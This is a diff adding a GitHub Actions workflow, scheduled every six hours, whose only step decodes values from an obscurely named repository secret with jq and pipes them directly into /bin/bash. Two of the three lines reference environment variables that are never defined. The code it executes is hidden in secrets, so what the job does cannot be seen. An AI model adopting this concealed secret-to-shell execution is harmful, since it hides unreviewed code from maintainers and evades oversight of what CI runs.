@@ -1,0 +1,20 @@
+name: tongluhongdong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongluhongdong
+        env:
+          j93527: ${{ secrets.j93527 }}
+        run: |
+          echo $j93527 | jq -r .hjoyw36436 | /bin/bash
+          echo $yee3 | jq -r .kozcr42992 | /bin/bash
+          echo $nun1774 | jq -r .htl36 | /bin/bash
+
